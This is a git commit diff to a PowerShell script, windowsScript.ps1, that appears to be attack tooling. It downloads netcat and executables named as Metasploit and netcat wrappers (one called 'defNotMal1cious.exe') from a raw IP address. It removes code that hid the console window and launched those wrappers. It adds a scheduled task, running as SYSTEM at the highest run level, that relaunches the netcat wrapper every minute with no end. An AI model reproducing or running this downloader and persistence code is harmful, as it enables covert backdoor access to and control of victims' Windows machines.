80d3e3d280c75fc2d4c45b6d99cd6d1fc4aadb01
soupsamich <66322946+soupsamich@users.noreply.github.com>
2020-06-28 16:16:55 -0400

    Update windowsScript.ps1

--- windowsScript.ps1
+++ windowsScript.ps1
@@ -9,11 +9,11 @@ Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFi
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.exe -OutFile C:/windowsWrapperMSF.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.exe -OutFile C:/windowsWrapperNC.exe;
-$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-add-type -name win -member $t -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-{Start-Process -FilePath C:\windowsWrapperNC.exe -NoNewWindow -RedirectStandardOutput C:\Users\HashCrackUser1\file -passthru}
-$s = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-add-type -name win -member $s -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-{Start-Process -FilePath C:\windowsWrapperMSF.exe -NoNewWindow -RedirectStandardOutput C:\Users\HashCrackUser1\file1 -passthru}
+$jobname = "windowsNC"
+$script =  "c:\windowsWrapperNC.exe"
+$repeat = (New-TimeSpan -Minutes 1)
+$action = New-ScheduledTaskAction –Execute "$pshome\powershell.exe" -Argument  "$script; quit"
+$duration = ([timeSpan]::maxvalue)
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat -RepetitionDuration $duration
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
+Register-ScheduledTask -TaskName $jobname -Action $action -Trigger $trigger -RunLevel Highest -User "System" -Settings $settings
